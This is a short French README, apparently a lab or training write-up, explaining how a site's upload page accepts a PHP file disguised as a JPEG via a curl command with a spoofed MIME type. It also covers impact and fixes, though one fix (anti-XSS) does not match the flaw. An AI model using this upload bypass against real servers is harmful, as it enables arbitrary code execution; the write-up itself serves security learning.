# README : Injection de code PHP via l'upload d'une image

## Description

Cette brèche met en évidence une vulnérabilité dans le processus d'upload de fichiers sur un site web. Elle permet à un attaquant potentiel d'injecter du code PHP au lieu d'une image, ce qui peut être utilisé pour exécuter des commandes arbitraires sur le serveur.

## Fonctionnement

- Accédez à la page d'upload : `http://X.X.X.X/?page=upload`
- Créez un fichier PHP contenant du code malveillant :

```php
echo '<?php echo "test de code PHP" ?>' > /tmp/php_injection.php
```

- Utilisez curl pour envoyer le fichier comme une image :

```shell
 curl -X POST -F "Upload=Upload" -F "uploaded=@/tmp/php_injection.php;type=image/jpeg" "http://X.X.X.X/index.php?page=upload"
```

- Le fichier PHP injecté sera téléchargé et exécuté sur le serveur.

## Impact

Cette vulnérabilité peut permettre à un attaquant de :

- Exécuter du code PHP arbitraire sur le serveur
- Accéder aux informations sensibles ou exécuter des commandes système
- Potentiellement compromettre la sécurité entière du serveur web

## Recommandations

Pour corriger cette vulnérabilité :

- Valider et sécuriser toutes les entrées utilisateur côté serveur avant de les utiliser ou de les stocker.
- Utiliser une validation robuste pour empêcher l'upload de fichiers PHP.
- Implémenter une protection anti-XSS pour éviter l'exécution de code malveillant dans le navigateur.
- Limiter les permissions du serveur web pour restreindre l'accès aux dossiers sensibles.
- Utiliser un filtre MIME pour vérifier le type réel des fichiers uploadés.
